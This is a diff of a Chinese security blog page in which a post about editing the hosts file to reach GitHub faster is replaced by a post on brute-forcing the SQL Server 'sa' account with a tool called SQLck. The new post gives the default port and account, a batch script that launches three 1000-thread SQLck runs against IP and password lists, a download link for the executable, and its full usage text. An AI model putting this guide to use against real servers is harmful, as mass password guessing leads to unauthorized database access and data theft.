@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>以较快的速度访问Github | Knsec         |       低调求发展 - 潜心习安全</title>
-  <meta name="keywords" content=" 其他 ">
-  <meta name="description" content="以较快的速度访问Github | Knsec         |       低调求发展 - 潜心习安全">
+  <title>利用Sqlck对SA爆破 | Knsec         |       低调求发展 - 潜心习安全</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="利用Sqlck对SA爆破 | Knsec         |       低调求发展 - 潜心习安全">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="利用Sqlck对SA爆破 SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），它最初是由Microsoft、Sybase和Ashton-Tate三家公司共同开发的，并于1988年推出了第一个OS&#x2F;2版本。Microsoft SQL Server近年来不断更新版本，1996年，Microsoft 推出了SQL Server 6.5版本；1998年，SQL Serve">
 <meta property="og:type" content="article">
@@ -320,39 +320,24 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-以较快的速度访问Github" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-利用Sqlck对SA爆破" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">以较快的速度访问Github</h1>
+        <h1 class="article-title">利用Sqlck对SA爆破</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="杂记">杂记</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color3">其他</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-07-09 11:47:37'>2020-07-09 11:19</time>
+            发布时间 : <time class="date" title='最后更新: 2020-07-17 18:11:00'>2020-07-17 17:16</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:336</span>
+        <span>字数:450</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -371,7 +356,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#修改Host文件"><span class="toc-text">修改Host文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitee"><span class="toc-text">gitee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#梯子"><span class="toc-text">梯子</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用Sqlck对SA爆破"><span class="toc-text">利用Sqlck对SA爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bat脚本"><span class="toc-text">Bat脚本</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -387,38 +372,46 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="修改Host文件"><a href="#修改Host文件" class="headerlink" title="修改Host文件"></a>修改Host文件</h2><blockquote>
-<p>C:\Windows\System32\drivers\etc\host</p>
+        <h2 id="利用Sqlck对SA爆破"><a href="#利用Sqlck对SA爆破" class="headerlink" title="利用Sqlck对SA爆破"></a>利用Sqlck对SA爆破</h2><blockquote>
+<p>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），它最初是由Microsoft、Sybase和Ashton-Tate三家公司共同开发的，并于1988年推出了第一个OS/2版本。Microsoft SQL Server近年来不断更新版本，1996年，Microsoft 推出了SQL Server 6.5版本；1998年，SQL Server 7.0版本和用户见面；SQL Server 2000是Microsoft公司于2000年推出，目前最新版本是2019年份推出的SQL SERVER 2019。    —-百度百科</p>
 </blockquote>
-<img src="/../images/image-20200709112420683.png" alt="image-20200709112420683" style="zoom:80%;" />
-
-<p>如果是第一次修改则需要去掉只读属性，并且更改文件的高级安全选项，使得自己的用户有权限修改host文件</p>
-<pre><code class="bash">192.30.253.112 Build software better, together 
-192.30.253.119 gist.github.com
-151.101.184.133 assets-cdn.github.com
-151.101.184.133 raw.githubusercontent.com
-151.101.184.133 gist.githubusercontent.com
-151.101.184.133 cloud.githubusercontent.com
-151.101.184.133 camo.githubusercontent.com
-151.101.184.133 avatars0.githubusercontent.com
-151.101.184.133 avatars1.githubusercontent.com
-151.101.184.133 avatars2.githubusercontent.com
-151.101.184.133 avatars3.githubusercontent.com
-151.101.184.133 Build software better, together
-151.101.184.133 avatars5.githubusercontent.com
-151.101.184.133 avatars6.githubusercontent.com
-151.101.184.133 avatars7.githubusercontent.com
-151.101.184.133 Build software better, together</code></pre>
-<img src="/../images/image-20200709112841487.png" alt="image-20200709112841487" style="zoom:80%;" />
-
-<p>修改过后保存并把刚刚修改的属性改回只读即可</p>
 <blockquote>
-<p>有些人会觉得修改host文件是一个安全性较差的方法</p>
-<p>其实修改host文件本质上就是省去了dns解析的步骤，但是当我们把Google修改到第三方ip地址时，这个做法确实是不能保证数据传输过程中的安全性。</p>
+<p>默认端口1433</p>
+<p>默认账户SA</p>
 </blockquote>
-<p><font color='red'> 至此，可以加快访问Github的速度，并且顺带解决头像、图片加载不出来的问题 </font></p>
-<h2 id="gitee"><a href="#gitee" class="headerlink" title="gitee"></a>gitee</h2><p>许多人比较推荐国内的这个类似gitee，但因个人原因，不太愿意使用这个方法。</p>
-<h2 id="梯子"><a href="#梯子" class="headerlink" title="梯子"></a>梯子</h2>
+<h2 id="Bat脚本"><a href="#Bat脚本" class="headerlink" title="Bat脚本"></a>Bat脚本</h2><blockquote>
+<p>保存存为bat文件，此为3个进程，每个进程1000线程</p>
+</blockquote>
+<pre><code class="bat">start SQLck1.exe -i S.txt -p  pass1.txt -o iplist1.txt -l Them.txt -t 1000
+start SQLck2.exe -i S.txt -p  pass2.txt -o iplist2.txt -l Them.txt -t 1000
+start SQLck3.exe -i S.txt -p  pass3.txt -o iplist3.txt -l Them.txt -t 1000</code></pre>
+<blockquote>
+<p>SQLck下载地址</p>
+<p><a href="https://github.com/Knsec/Tools/blob/master/SQLck.exe" target="_blank" rel="noopener">https://github.com/Knsec/Tools/blob/master/SQLck.exe</a></p>
+</blockquote>
+<pre><code class="bash">Usage:  SQLck [Option1] [Option2] ...
+
+Valid options are:
+  -i &lt;IP-list.txt&gt;      :: IP address (numbers) list stored in an ASCII file
+          Formats that are supported:: &lt;IP&gt;:&lt;port&gt;  ;  &lt;IP&gt; &lt;port&gt;                                       &lt;IP&gt; Port:&lt;port&gt;  ;  &lt;IP&gt; &lt;port&gt;/tcp
+  -u &lt;username.txt&gt;     :: Username list stored in an ASCII file
+  -p &lt;password.txt&gt;     :: Password list stored in an ASCII file
+  -o &lt;outputFile.txt&gt;   :: Output file to use for output
+  -d                    :: turn on Debug mode
+  -t &lt;number&gt;           :: number of threads to use: default 128
+  -l &lt;logFile.txt&gt;      :: Logfile to use for Logs
+  -s &lt;IP ADDRESS&gt;:&lt;port&gt;:: to test one IP address (numbers only, NO DNS)
+  -y &lt;password&gt;         :: to test one password
+  -r &lt;username&gt;         :: to test one username
+  -c                    :: To have threads use more CPU
+  -m                    :: Max number of sockets to use (45,000 default)
+  -a                    :: Check ALL pass, even if finds a good one
+
+DEFAULTS: &#39;IP=127.0.0.1&#39; &#39;Port=1433&#39; &#39;Username=sa&#39; &#39;Password=&#39; &#39;Output to screen
+
+EXAMPLE: SQLck -i IP.txt -p Pass.txt -o output.txt
+  Means:using IP.txt for IP address list,,using Pass.txt for Password list,using output.txt to output any found passwords</code></pre>
+
       
        
     </div>
